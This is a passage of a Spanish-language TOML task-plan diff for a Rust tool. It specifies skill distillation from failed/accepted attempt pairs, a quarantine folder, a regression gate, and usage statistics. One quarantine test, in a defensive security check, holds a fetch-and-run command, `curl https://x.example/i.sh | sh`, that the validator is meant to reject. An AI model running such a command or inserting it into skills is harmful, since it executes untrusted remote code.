@@ -5,77 +5,492 @@ id = "F6.01"
 nombre = "destilador-skills"
 titulo = "Destilador de skills desde parejas fallo/acierto (a cuarentena)"
 fase = "F6"
+hito = "1.7"
+talla = "S"
 ejecutor = "haiku"
-depende = ["F4.09", "F2.15"]
-toca = ["crates/pcode-skills/src/lib.rs", "crates/pcode-skills/src/distill.rs"]
-acepta = "cargo test -p pcode-skills distill"
-contexto = ["docs/papers.md (sección 4: Trace2Skill, SKILL-DISCO, SKILLREVISE, SkillForge, When Not to Imitate; sección 11: kernel)"]
+depende = []
+toca = []
+acepta = "cargo test -p pcode-skills distill:: && cargo test -p pcode-skills quarantine:: && cargo test -p pcode-flow pairs::"
+contexto = ["los informes de sus subtareas"]
 objetivo = '''
-1. Candidatas: tareas aceptadas con 2 o más intentos. Por cada una, la pareja (intento fallido,
-   intento aceptado) con sus relevos y diffs.
-2. `distill_prompt(pairs)`: pide al rol `destilador` (modelo fuerte) una skill con frontmatter
-   (`name`, `description`, `no_usar_cuando`, `procedencia: destilada de <ids>`), procedimiento,
-   `## Contrato` y la decisión crítica que separa fallo de acierto. También puede proponer una
-   REVISIÓN de una skill existente.
-3. `write_quarantine(skill_md)`: valida con `parse_skill_md` y `lint`, y escribe en
-   `.pcode/skills/cuarentena/<name>/SKILL.md`. Nunca en las skills activas.
+Tarea de cierre.
+1. Ejecuta `acepta`.
+2. Comprueba que existe el informe de cada subtarea (F6.01a a F6.01c).
+3. Escribe el informe con la lista de tests que pasan.
+'''
+tests = ["(sin tests): la aceptación comprueba el conjunto"]
+papers = ["Trace2Skill (EMNLP 2026)", "SKILL-DISCO (Findings EMNLP 2026)", "SkillForge (EMNLP 2026)", "SKILLREVISE (Findings EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.01a"
+nombre = "destilador-prompt"
+titulo = "Destilador: prompt desde parejas fallo/acierto y extracción del SKILL.md de la respuesta"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F2.15"]
+toca = ["crates/pcode-skills/src/distill.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills distill::"
+contexto = [
+  "crates/pcode-skills/src/registry.rs (`parse_skill_md`: claves del frontmatter `name`, `description`, `no_usar_cuando`, `procedencia`; `Registry::index()` da el índice de skills existentes)",
+  "crates/pcode-skills/src/contract.rs (constante `OK` del `mod tests`: forma de la sección `## Contrato`)",
+]
+objetivo = '''
+1. Crea `distill.rs` con `AttemptPair`, `distill_prompt` y `extract_skill_md` (firmas abajo). Funciones
+   puras: no llaman a ningún modelo.
+2. `distill_prompt(pairs, existing_index)` devuelve, en este orden:
+   a) el párrafo fijo: «Eres el destilador de skills de PublicCode. A partir de parejas (intento
+      fallido, intento aceptado) de la misma tarea, escribe UNA skill reutilizable que recoja la
+      decisión crítica que separa el fallo del acierto. No copies el diff: generaliza.»
+   b) `## Formato de salida` con la plantilla exacta de un SKILL.md: frontmatter entre líneas `---` con
+      `name:` (minúsculas y guiones), `description:` (máx. 300 caracteres), `no_usar_cuando:` y
+      `procedencia: destilada de <ids separados por coma>`; después `# Título`, `## Procedimiento`,
+      `## Decisión crítica` y `## Contrato` con `### Entradas`, `### Salidas` y `### Ejemplo`. Añade la
+      frase: «Responde SOLO con el SKILL.md.»
+   c) `## Skills existentes` + `existing_index` (o `(ninguna)` si está vacío) y la frase «Si una ya
+      cubre el caso, devuelve esa skill REVISADA con el mismo `name`.»
+   d) por cada pareja: `## Pareja <task_id>`, `### Intento fallido` + `failed_handoff` recortado a 1500
+      caracteres, `### Resumen del intento aceptado` + `success_summary`, y `### Diff aceptado` + un
+      bloque de código con `success_diff` recortado a 4000 caracteres. Al recortar, corta por carácter
+      (no por byte) y añade `…`.
+   La línea `procedencia` de la plantilla lleva los `task_id` reales de `pairs`.
+3. `extract_skill_md(reply)`: devuelve el texto desde la primera línea que es exactamente `---` hasta el
+   final, quitando una última línea que sea solo una valla de código (tres acentos graves) y los
+   espacios finales, y terminado en `\n`. `None` si no hay ninguna línea `---`.
+4. `lib.rs`: `pub mod distill;` y `pub use distill::{AttemptPair, distill_prompt, extract_skill_md};`.
 '''
 firmas = '''
+// crates/pcode-skills/src/distill.rs
+/// Un intento fallido y el intento aceptado de la misma tarea.
+#[derive(Debug, Clone, PartialEq)]
 pub struct AttemptPair { pub task_id: String, pub failed_handoff: String, pub success_diff: String, pub success_summary: String }
+
+/// Prompt para el rol `destilador` (modelo fuerte).
 pub fn distill_prompt(pairs: &[AttemptPair], existing_index: &str) -> String;
-pub fn write_quarantine(repo_root: &std::path::Path, skill_md: &str) -> Result<std::path::PathBuf, SkillError>;
+
+/// El SKILL.md contenido en la respuesta del modelo (aunque venga dentro de una valla de código).
+pub fn extract_skill_md(reply: &str) -> Option<String>;
 '''
-tests = ["prompt_incluye_parejas_y_formato", "cuarentena_valida_y_escribe", "cuarentena_rechaza_sin_no_usar_cuando", "nunca_escribe_en_activas"]
-papers = ["Trace2Skill (EMNLP 2026)", "SKILL-DISCO (Findings EMNLP 2026)", "SkillForge (EMNLP 2026)", "SKILLREVISE (Findings EMNLP 2026)"]
+ejemplo = '''
+extract_skill_md("Aquí va:\n```markdown\n---\nname: x\ndescription: d\n---\n# X\n```\n")
+  → Some("---\nname: x\ndescription: d\n---\n# X\n")
+extract_skill_md("no puedo")  → None
+'''
+tests = [
+  "prompt_incluye_parejas_y_formato: con dos parejas `F1.01` y `F1.02`, el prompt contiene `## Pareja F1.01`, `## Pareja F1.02`, `no_usar_cuando:` y `procedencia: destilada de F1.01, F1.02`",
+  "prompt_recorta_diffs_largos: un `success_diff` de 10000 caracteres aparece recortado (el prompt mide menos de 8000 caracteres más el resto) y contiene `…`",
+  "prompt_sin_skills_existentes: con `existing_index` vacío aparece `(ninguna)`",
+  "extrae_de_una_valla: el primer ejemplo devuelve exactamente esa cadena",
+  "extrae_sin_valla: una respuesta que empieza directamente por `---` se devuelve entera terminada en un salto de línea",
+  "sin_frontmatter_es_none: `no puedo` devuelve None",
+]
+no_hagas = ["No llames a ningún proveedor ni a la red", "No escribas archivos en esta tarea", "No añadas dependencias"]
+papers = ["Trace2Skill (EMNLP 2026)", "SKILL-DISCO (Findings EMNLP 2026)", "SKILLREVISE (Findings EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.01b"
+nombre = "destilador-cuarentena"
+titulo = "Destilador: validar una skill aprendida y guardarla en cuarentena"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.01a", "F7.01a"]
+toca = ["crates/pcode-skills/src/quarantine.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills quarantine::"
+contexto = [
+  "crates/pcode-skills/src/registry.rs (`parse_skill_md(text, dir) -> Result<Skill, SkillError>` y `SkillError::Invalid(String, String)`)",
+  "crates/pcode-skills/src/contract.rs (`lint(skill: &Skill) -> Vec<String>`: avisos de contrato; exige `no_usar_cuando` si la procedencia empieza por `destilada`)",
+  "crates/pcode-skills/src/lint_security.rs (`lint_security(skill, allowed_domains: &[String]) -> Vec<SecurityFinding>` con campos `rule` y `detail`)",
+]
+objetivo = '''
+1. Crea `quarantine.rs` con `quarantine_dir`, `write_quarantine` y `list_quarantine` (firmas abajo).
+2. `quarantine_dir(repo_root)` = `<repo_root>/.pcode/skills/cuarentena`.
+3. `write_quarantine(repo_root, skill_md)` valida en este orden y, al primer fallo, devuelve
+   `SkillError::Invalid(<nombre o "cuarentena">, <motivo>)` sin escribir nada:
+   a) `parse_skill_md(skill_md, Path::new("."))` (su error se propaga tal cual);
+   b) el nombre solo tiene `a-z`, `0-9` y `-`, no está vacío y no empieza por `-`
+      (motivo: `nombre no válido`); esto impide rutas como `../x`;
+   c) `provenance` empieza por `destilada` (motivo: `una skill aprendida declara procedencia: destilada de …`);
+   d) `lint(&skill)` está vacío (motivo: los avisos unidos con `; `);
+   e) `lint_security(&skill, &[])` está vacío (motivo: `seguridad: ` + las reglas `rule` unidas con `, `);
+   f) no existe ya `<cuarentena>/<name>/` (motivo: `ya está en cuarentena`).
+   Si todo va bien, crea `<cuarentena>/<name>/SKILL.md` con el texto recibido y devuelve su ruta.
+   NUNCA escribe en `.claude/skills/` ni en ninguna otra carpeta de skills activas.
+4. `list_quarantine(repo_root)`: nombres de las subcarpetas de la cuarentena que tienen `SKILL.md`,
+   ordenados; vector vacío si la carpeta no existe.
+5. `lib.rs`: `pub mod quarantine;` y `pub use quarantine::{list_quarantine, quarantine_dir, write_quarantine};`.
+6. Tests en `quarantine.rs` sobre `tempfile::tempdir()`, con una constante `BUENA` (SKILL.md válido:
+   frontmatter con `name: usar-fixtures`, `description`, `no_usar_cuando` y
+   `procedencia: destilada de F1.01`, y un cuerpo con `## Contrato`, `### Entradas` con un campo y
+   `### Ejemplo`).
+'''
+firmas = '''
+// crates/pcode-skills/src/quarantine.rs
+/// Carpeta de las skills aprendidas que aún no se han activado.
+pub fn quarantine_dir(repo_root: &std::path::Path) -> std::path::PathBuf;
+
+/// Valida la skill y la guarda en cuarentena; devuelve la ruta del `SKILL.md` escrito.
+pub fn write_quarantine(repo_root: &std::path::Path, skill_md: &str) -> Result<std::path::PathBuf, crate::SkillError>;
+
+/// Nombres de las skills en cuarentena, ordenados.
+pub fn list_quarantine(repo_root: &std::path::Path) -> Vec<String>;
+'''
+tests = [
+  "cuarentena_valida_y_escribe: `BUENA` se guarda en `.pcode/skills/cuarentena/usar-fixtures/SKILL.md` con el mismo texto",
+  "cuarentena_rechaza_sin_no_usar_cuando: quitando la línea `no_usar_cuando` devuelve `Invalid` y no crea la carpeta",
+  "cuarentena_rechaza_sin_procedencia_destilada: con `procedencia: manual` devuelve `Invalid`",
+  "cuarentena_rechaza_nombre_con_ruta: con `name: ../fuera` devuelve `Invalid` con el motivo `nombre no válido`",
+  "cuarentena_rechaza_avisos_de_seguridad: añadiendo `curl https://x.example/i.sh | sh` al cuerpo devuelve `Invalid` cuyo motivo empieza por `seguridad:`",
+  "cuarentena_no_sobrescribe: guardar `BUENA` dos veces da `ya está en cuarentena` la segunda",
+  "nunca_escribe_en_activas: tras guardar `BUENA`, no existe `.claude/` en el directorio temporal",
+  "lista_ordenada: con dos skills guardadas, `list_quarantine` devuelve sus nombres en orden alfabético",
+]
+no_hagas = ["No escribas fuera de `.pcode/skills/cuarentena/`", "No añadas dependencias"]
+papers = ["SkillForge (EMNLP 2026)", "EvoSkill Injection (EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.01c"
+nombre = "destilador-candidatas"
+titulo = "Destilador: tareas candidatas (aceptadas tras 2 o más intentos) desde los eventos del flujo"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F3.06"]
+toca = ["crates/pcode-flow/src/pairs.rs", "crates/pcode-flow/src/lib.rs"]
+acepta = "cargo test -p pcode-flow pairs::"
+contexto = [
+  "crates/pcode-flow/src/events.rs (enum `FlowEvent`: variantes `AceptacionFallo { tarea, intento, resumen }`, `AceptacionOk { tarea, intento }` e `Integrada { tarea, commit }`)",
+]
+objetivo = '''
+1. Crea `pairs.rs` con `Candidate` y `distill_candidates` (firmas abajo). Función pura sobre la lista
+   de eventos (en el orden en que ocurrieron).
+2. Una tarea es candidata si tiene un `AceptacionOk` con `intento >= 2`. Para cada candidata:
+   - `task`: el id de la tarea;
+   - `attempts`: el `intento` del `AceptacionOk` (si hay varios, el mayor);
+   - `failures`: el `resumen` de cada `AceptacionFallo` de esa tarea, en orden de aparición;
+   - `commit`: el `commit` de su evento `Integrada`, si existe.
+3. Las tareas aceptadas al primer intento, las que nunca se aceptaron y los demás tipos de evento se
+   ignoran. El resultado va ordenado por `task`.
+4. `lib.rs`: `pub mod pairs;` y `pub use pairs::{Candidate, distill_candidates};`.
+'''
+firmas = '''
+// crates/pcode-flow/src/pairs.rs
+/// Tarea de la que se puede aprender: falló al menos una vez y después se aceptó.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Candidate { pub task: String, pub attempts: u32, pub failures: Vec<String>, pub commit: Option<String> }
+
+/// Candidatas a destilar una skill, ordenadas por id de tarea.
+pub fn distill_candidates(events: &[crate::FlowEvent]) -> Vec<Candidate>;
+'''
+ejemplo = '''
+eventos: AceptacionFallo{tarea:"B", intento:1, resumen:"test x falla"}, AceptacionOk{tarea:"A", intento:1},
+         AceptacionOk{tarea:"B", intento:2}, Integrada{tarea:"B", commit:"abc123"}
+salida:  [Candidate { task: "B", attempts: 2, failures: ["test x falla"], commit: Some("abc123") }]
+'''
+tests = [
+  "candidata_con_dos_intentos: el ejemplo devuelve solo la tarea B con su fallo y su commit",
+  "aceptada_a_la_primera_no_es_candidata: una tarea con `AceptacionOk` de intento 1 no aparece",
+  "nunca_aceptada_no_es_candidata: una tarea con dos `AceptacionFallo` y ningún `AceptacionOk` no aparece",
+  "varios_fallos_en_orden: una tarea con fallos en los intentos 1 y 2 y acierto en el 3 tiene `attempts` 3 y los dos resúmenes en orden",
+  "sin_integrar_commit_none: una candidata sin evento `Integrada` tiene `commit` None",
+  "eventos_vacios: una lista vacía devuelve un vector vacío",
+]
+no_hagas = ["No leas el store ni archivos: solo se recorre la lista de eventos", "No cambies `FlowEvent`"]
+papers = ["Trace2Skill (EMNLP 2026)"]
 
 [[tarea]]
 id = "F6.02"
 nombre = "puerta-regresion"
 titulo = "Puerta de regresión: una skill sale de cuarentena solo si mejora sin romper nada"
 fase = "F6"
+hito = "1.7"
+talla = "S"
 ejecutor = "haiku"
-depende = ["F6.01", "F3.13"]
-toca = ["crates/pcode-skills/src/lib.rs", "crates/pcode-skills/src/gate.rs"]
-acepta = "cargo test -p pcode-skills gate"
-contexto = ["docs/papers.md (GRASP, Harness Updating Is Not Harness Benefit, EvoSkill Injection)"]
+depende = []
+toca = []
+acepta = "cargo test -p pcode-skills gate::"
+contexto = ["los informes de sus subtareas"]
 objetivo = '''
-1. Subconjunto de evaluación: tareas del bench cuyos rasgos casan con la skill, más 5 tareas de
-   control no relacionadas.
-2. `decide(baseline, with_skill)`: activar solo si (a) ninguna tarea que pasaba a la primera deja de
-   pasar, (b) al menos una mejora y (c) el coste en tokens no sube más de un 15 %. Si no → rechazar
-   con el motivo.
-3. Activar = mover de `cuarentena/` a `.claude/skills/` (o a la fuente configurada) con un archivo
-   `EVIDENCIA.md` (tablas antes y después).
+Tarea de cierre.
+1. Ejecuta `acepta`.
+2. Comprueba que existe el informe de cada subtarea (F6.02a y F6.02b).
+3. Escribe el informe con la lista de tests que pasan.
+'''
+tests = ["(sin tests): la aceptación comprueba el conjunto"]
+papers = ["GRASP (EMNLP 2026)", "Harness Updating Is Not Harness Benefit (EMNLP 2026)", "EvoSkill Injection (EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.02a"
+nombre = "puerta-decision"
+titulo = "Puerta de regresión: decidir con los resultados del banco antes y después (lógica pura)"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.01b", "F3.13"]
+toca = ["crates/pcode-skills/src/gate.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills gate::tests::decide_ && cargo test -p pcode-skills gate::tests::filas_"
+contexto = [
+  "crates/pcode-skills/src/lib.rs (cómo se declara un módulo y se reexporta con `pub use`)",
+  "docs/evaluacion.md (sección de métricas: qué significa «a la primera» y el coste en tokens)",
+]
+objetivo = '''
+1. Crea `gate.rs` con `BenchRowLite`, `GateDecision`, `parse_rows` y `decide` (firmas abajo). Puro.
+2. `parse_rows(jsonl)`: cada línea no vacía es un objeto JSON del resultado de `pcode bench`. Como el
+   crate no tiene `serde_json`, extrae los campos con un lector mínimo propio (función privada
+   `field(line, key) -> Option<&str>` que busca `"key":` y devuelve el valor hasta la siguiente `,` o
+   `}`; a las cadenas se les quitan las comillas). Campos: `id` (cadena); `ok_first` (o, si no está,
+   `ok_primera`) con valor `true`/`false`; `tokens` (o, si no está, la suma de `tokens_in` y
+   `tokens_out`; 0 si no hay ninguno). Las líneas sin `id` se ignoran.
+3. `decide(baseline, with_skill)` compara por `id` y comprueba en este orden:
+   a) `baseline` vacío → `Reject("sin datos de referencia")`;
+   b) ids de `baseline` que faltan en `with_skill` → `Reject("faltan resultados de: <ids con coma>")`;
+   c) regresión: ids con `ok_first` true antes y false después → `Reject("regresión en: <ids>")`;
+   d) mejora: si ningún id pasa de false a true → `Reject("sin mejora")`;
+   e) coste: suma de `tokens` después > suma antes × 1,15 (solo si la suma de antes es > 0) →
+      `Reject("coste: +<N> % de tokens")` con N redondeado al entero;
+   f) si no, `Activate`.
+   Los ids se listan en orden alfabético.
+4. `lib.rs`: `pub mod gate;` y `pub use gate::{BenchRowLite, GateDecision, decide, parse_rows};`.
 '''
 firmas = '''
-#[derive(Debug, PartialEq)] pub enum GateDecision { Activate, Reject(String) }
-pub fn decide(baseline: &[BenchRowLite], with_skill: &[BenchRowLite]) -> GateDecision;
+// crates/pcode-skills/src/gate.rs
+/// Resultado de una tarea del banco, lo justo para decidir.
+#[derive(Debug, Clone, PartialEq, Eq)]
 pub struct BenchRowLite { pub id: String, pub ok_first: bool, pub tokens: u64 }
-pub fn activate(repo_root: &std::path::Path, name: &str, evidence_md: &str) -> Result<(), SkillError>;
+
+/// Decisión de la puerta.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum GateDecision { Activate, Reject(String) }
+
+/// Lee las filas de un archivo de resultados del banco (JSONL).
+pub fn parse_rows(jsonl: &str) -> Vec<BenchRowLite>;
+
+/// Activar solo si no hay regresión, hay al menos una mejora y el coste no sube más de un 15 %.
+pub fn decide(baseline: &[BenchRowLite], with_skill: &[BenchRowLite]) -> GateDecision;
 '''
-tests = ["activa_si_mejora_sin_regresion", "rechaza_regresion", "rechaza_coste", "rechaza_sin_mejora", "activa_mueve_y_escribe_evidencia"]
-papers = ["GRASP (EMNLP 2026)", "Harness Updating Is Not Harness Benefit (EMNLP 2026)", "EvoSkill Injection (EMNLP 2026)"]
+ejemplo = '''
+parse_rows("{\"id\":\"t1\",\"ok_first\":true,\"tokens_in\":100,\"tokens_out\":20}\n")
+  → [BenchRowLite { id: "t1", ok_first: true, tokens: 120 }]
+antes:   t1 ok 100 · t2 falla 100        después: t1 ok 100 · t2 ok 110   → Activate
+antes:   t1 ok 100 · t2 falla 100        después: t1 falla 100 · t2 ok 100 → Reject("regresión en: t1")
+antes:   t1 ok 100 · t2 falla 100        después: t1 ok 150 · t2 ok 150   → Reject("coste: +50 % de tokens")
+'''
+tests = [
+  "decide_activa_si_mejora_sin_regresion: el primer caso del ejemplo da `Activate`",
+  "decide_rechaza_regresion: el segundo caso da `Reject` con el texto `regresión en: t1`",
+  "decide_rechaza_coste: el tercer caso da `Reject(\"coste: +50 % de tokens\")`",
+  "decide_rechaza_sin_mejora: resultados idénticos antes y después dan `Reject(\"sin mejora\")`",
+  "decide_rechaza_si_faltan_resultados: si falta t2 después da `Reject(\"faltan resultados de: t2\")`",
+  "decide_rechaza_sin_datos: con `baseline` vacío da `Reject(\"sin datos de referencia\")`",
+  "filas_con_tokens_separados: la línea del ejemplo suma `tokens_in` y `tokens_out`",
+  "filas_con_nombres_en_espanol: `{\"id\":\"a\",\"ok_primera\":false,\"tokens\":7}` da ok_first false y tokens 7",
+  "filas_ignora_lineas_sin_id: una línea vacía y otra sin `id` no producen filas",
+]
+no_hagas = ["No añadas `serde_json` ni otras dependencias al crate", "No ejecutes el banco: solo se comparan resultados ya escritos"]
+papers = ["GRASP (EMNLP 2026)", "Harness Updating Is Not Harness Benefit (EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.02b"
+nombre = "puerta-activar"
+titulo = "Puerta de regresión: activar una skill en cuarentena con su `EVIDENCIA.md`"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.02a"]
+toca = ["crates/pcode-skills/src/gate.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills gate::tests::activa_ && cargo test -p pcode-skills gate::tests::evidencia_"
+contexto = [
+  "crates/pcode-skills/src/gate.rs (`BenchRowLite { id, ok_first, tokens }`, `GateDecision`, `decide`: ya existen)",
+  "crates/pcode-skills/src/quarantine.rs (`quarantine_dir(repo_root) -> PathBuf` = `.pcode/skills/cuarentena`)",
+]
+objetivo = '''
+1. En `gate.rs` añade `evidence_md` y `activate` (firmas abajo).
+2. `evidence_md(name, baseline, with_skill)`: Markdown con el título `# Evidencia de <name>`, una tabla
+   `| tarea | antes | después | tokens antes | tokens después |` con una fila por id de `baseline` en
+   orden alfabético (`✓` si `ok_first`, `✗` si no; `—` si falta en `with_skill`), una línea
+   `Total de tokens: <antes> → <después>` y la línea final `Decisión: activar` o
+   `Decisión: rechazar (<motivo>)` según `decide(baseline, with_skill)`.
+3. `activate(repo_root, name, baseline, with_skill)`:
+   a) `name` solo con `a-z`, `0-9` y `-` (si no: `SkillError::Invalid(name, "nombre no válido")`);
+   b) debe existir `<cuarentena>/<name>/SKILL.md` (si no: `Invalid(name, "no está en cuarentena")`);
+   c) `decide(baseline, with_skill)` debe ser `Activate` (si no: `Invalid(name, <motivo del rechazo>)`,
+      y la skill se queda en cuarentena);
+   d) el destino `<repo_root>/.claude/skills/<name>` no debe existir (`Invalid(name, "ya existe una skill activa con ese nombre")`);
+   e) crea `<repo_root>/.claude/skills/`, mueve la carpeta con `std::fs::rename`, escribe dentro
+      `EVIDENCIA.md` con `evidence_md(…)` y devuelve la ruta de la carpeta activa.
+4. `lib.rs`: añade `activate` y `evidence_md` al `pub use gate::{…}`.
+5. Tests en `gate.rs` (prefijos `activa_` y `evidencia_`) sobre `tempfile::tempdir()`; la skill en
+   cuarentena se crea a mano escribiendo `<tmp>/.pcode/skills/cuarentena/<name>/SKILL.md`.
+'''
+firmas = '''
+// crates/pcode-skills/src/gate.rs
+/// Tabla de antes y después que justifica la decisión.
+pub fn evidence_md(name: &str, baseline: &[BenchRowLite], with_skill: &[BenchRowLite]) -> String;
+
+/// Saca la skill de cuarentena a `.claude/skills/<name>/` si la puerta la aprueba; deja `EVIDENCIA.md`.
+pub fn activate(repo_root: &std::path::Path, name: &str, baseline: &[BenchRowLite], with_skill: &[BenchRowLite])
+    -> Result<std::path::PathBuf, crate::SkillError>;
+'''
+tests = [
+  "activa_mueve_y_escribe_evidencia: con una mejora sin regresión, la carpeta pasa a `.claude/skills/<name>/` con `SKILL.md` y `EVIDENCIA.md`, y ya no está en cuarentena",
+  "activa_rechazada_se_queda_en_cuarentena: con una regresión devuelve `Invalid` y la carpeta sigue en cuarentena",
+  "activa_exige_estar_en_cuarentena: un nombre que no existe da `no está en cuarentena`",
+  "activa_no_pisa_una_skill_activa: si ya existe `.claude/skills/<name>/` devuelve `Invalid` y no la toca",
+  "activa_rechaza_nombre_con_ruta: `../x` da `nombre no válido`",
+  "evidencia_tabla_y_decision: la tabla tiene una fila por tarea con `✓`/`✗` y termina en `Decisión: activar`",
+]
+no_hagas = [
+  "No toques la carpeta `.claude/` de este repo: los tests usan directorios temporales",
+  "No borres la skill de cuarentena si la puerta la rechaza",
+]
+papers = ["GRASP (EMNLP 2026)", "EvoSkill Injection (EMNLP 2026)"]
 
 [[tarea]]
 id = "F6.03"
 nombre = "gobierno-skills"
 titulo = "Gobierno de skills y subagentes reutilizables"
 fase = "F6"
+hito = "1.7"
+talla = "S"
 ejecutor = "haiku"
-depende = ["F6.02"]
-toca = ["crates/pcode-skills/src/lib.rs", "crates/pcode-skills/src/governance.rs"]
-acepta = "cargo test -p pcode-skills governance"
-contexto = ["docs/papers.md (SkillsVote, AgentFactory)"]
+depende = []
+toca = []
+acepta = "cargo test -p pcode-skills governance::"
+contexto = ["los informes de sus subtareas"]
 objetivo = '''
-1. Estadísticas por skill (en SQLite): activaciones, tareas aceptadas con y sin ella y última vez usada.
-2. `recommend(task)`: skills ordenadas por utilidad observada para tareas con esos rasgos.
-3. `retire_candidates(days)`: skills sin beneficio medible en N días → propuesta de retirada (no
-   borra: mueve a `.pcode/skills/retiradas/`).
-4. Subagentes reutilizables: guardar una definición de subagente que funcionó (rol, prompt, tools,
-   política hija y skills) en `.pcode/agentes/<nombre>.toml` y cargarla por nombre.
+Tarea de cierre.
+1. Ejecuta `acepta`.
+2. Comprueba que existe el informe de cada subtarea (F6.03a y F6.03b).
+3. Escribe el informe. Anota en *Pendiente* que los subagentes reutilizables
+   (`.pcode/agentes/<nombre>.toml`) quedan para la función de agentes propios del hito 1.3.
 '''
-tests = ["recomienda_por_utilidad", "propone_retirada", "guarda_y_carga_subagente"]
+tests = ["(sin tests): la aceptación comprueba el conjunto"]
 papers = ["SkillsVote (EMNLP 2026)", "AgentFactory (ACL 2026 Demo)"]
+
+[[tarea]]
+id = "F6.03a"
+nombre = "gobierno-estadisticas"
+titulo = "Gobierno de skills: estadísticas de uso, recomendación y candidatas a retirada (lógica pura)"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.02b"]
+toca = ["crates/pcode-skills/src/governance.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills governance::tests::uso_"
+contexto = ["crates/pcode-skills/src/lib.rs (cómo se declara un módulo y se reexporta con `pub use`)"]
+objetivo = '''
+1. Crea `governance.rs` con `UseRecord`, `SkillStats`, `parse_uses`, `format_use`, `stats`, `recommend`
+   y `retire_candidates` (firmas abajo). Todo puro; el día se pasa como número (días desde 1970-01-01).
+2. Formato del registro de uso: una línea por uso con cuatro campos separados por tabulador:
+   `skill`, `tarea`, `1` o `0` (la tarea se aceptó o no) y el día. `format_use` escribe esa línea (sin
+   salto final); `parse_uses` lee todas e ignora las líneas vacías o mal formadas.
+3. `stats(uses)`: una entrada por skill, ordenadas por nombre: `uses` (número de usos), `accepted`
+   (usos con tarea aceptada) y `last_day` (el día mayor).
+4. `recommend(stats, candidates)`: devuelve `candidates` ordenadas de mayor a menor utilidad observada,
+   `(accepted + 1) / (uses + 2)` (una skill sin datos vale 0,5); a igual utilidad, por nombre.
+5. `retire_candidates(stats, today, days)`: skills que cumplen alguna de estas dos condiciones:
+   `today - last_day > days` (sin uso reciente) o `uses >= 5` y `accepted * 10 < uses * 3` (menos del
+   30 % de aciertos). Ordenadas por nombre. Las skills sin ningún uso no están en `stats` y no se proponen.
+6. `lib.rs`: `pub mod governance;` y
+   `pub use governance::{SkillStats, UseRecord, format_use, parse_uses, recommend, retire_candidates, stats};`.
+7. Tests en `governance.rs` con el prefijo `uso_`.
+'''
+firmas = '''
+// crates/pcode-skills/src/governance.rs
+/// Un uso de una skill en una tarea.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct UseRecord { pub skill: String, pub task: String, pub accepted: bool, pub day: u64 }
+
+/// Resumen de uso de una skill.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SkillStats { pub skill: String, pub uses: u32, pub accepted: u32, pub last_day: u64 }
+
+pub fn format_use(u: &UseRecord) -> String;
+pub fn parse_uses(text: &str) -> Vec<UseRecord>;
+pub fn stats(uses: &[UseRecord]) -> Vec<SkillStats>;
+/// `candidates` ordenadas por utilidad observada (mejor primero).
+pub fn recommend(stats: &[SkillStats], candidates: &[String]) -> Vec<String>;
+/// Skills que conviene proponer para retirada.
+pub fn retire_candidates(stats: &[SkillStats], today: u64, days: u64) -> Vec<String>;
+'''
+ejemplo = '''
+format_use(&UseRecord { skill: "banco".into(), task: "F3.13".into(), accepted: true, day: 20400 })
+  → "banco\tF3.13\t1\t20400"
+stats de [banco ok día 20400, banco fallo día 20410, adr ok día 20000]
+  → [ {adr, uses 1, accepted 1, last_day 20000}, {banco, uses 2, accepted 1, last_day 20410} ]
+recommend(esas stats, ["banco", "adr", "nueva"]) → ["adr", "banco", "nueva"]   (0,667 · 0,5 · 0,5; empate por nombre)
+retire_candidates(esas stats, 20420, 90) → ["adr"]   (420 días sin uso)
+'''
+tests = [
+  "uso_formato_ida_y_vuelta: `parse_uses(format_use(u))` devuelve el mismo registro",
+  "uso_ignora_lineas_rotas: una línea vacía y otra con tres campos no producen registros",
+  "uso_estadisticas_por_skill: el ejemplo de `stats` da esas dos entradas en ese orden",
+  "uso_recomienda_por_utilidad: el ejemplo de `recommend` da `adr`, `banco`, `nueva`",
+  "uso_propone_retirada_por_inactividad: el ejemplo de `retire_candidates` da solo `adr`",
+  "uso_propone_retirada_por_pocos_aciertos: una skill con 10 usos y 2 aciertos usada hoy se propone; con 10 usos y 3 aciertos no",
+]
+no_hagas = ["No leas el reloj ni archivos en esta tarea", "No añadas dependencias (ni `serde_json` ni `rusqlite`)"]
+papers = ["SkillsVote (EMNLP 2026)"]
+
+[[tarea]]
+id = "F6.03b"
+nombre = "gobierno-registro-retirada"
+titulo = "Gobierno de skills: registrar usos en disco y retirar una skill sin borrarla"
+fase = "F6"
+hito = "1.7"
+talla = "S"
+ejecutor = "haiku"
+depende = ["F6.03a"]
+toca = ["crates/pcode-skills/src/governance.rs", "crates/pcode-skills/src/lib.rs"]
+acepta = "cargo test -p pcode-skills governance::tests::disco_"
+contexto = [
+  "crates/pcode-skills/src/governance.rs (`UseRecord`, `format_use(&UseRecord) -> String`, `parse_uses(&str) -> Vec<UseRecord>`: ya existen)",
+  "crates/pcode-skills/src/registry.rs (enum `SkillError`: `Io` e `Invalid(String, String)`)",
+]
+objetivo = '''
+1. En `governance.rs` añade `uses_path`, `record_use`, `load_uses` y `retire` (firmas abajo).
+2. `uses_path(repo_root)` = `<repo_root>/.pcode/skills/uso.tsv`.
+3. `record_use(repo_root, u)`: crea la carpeta si falta y AÑADE al final del archivo
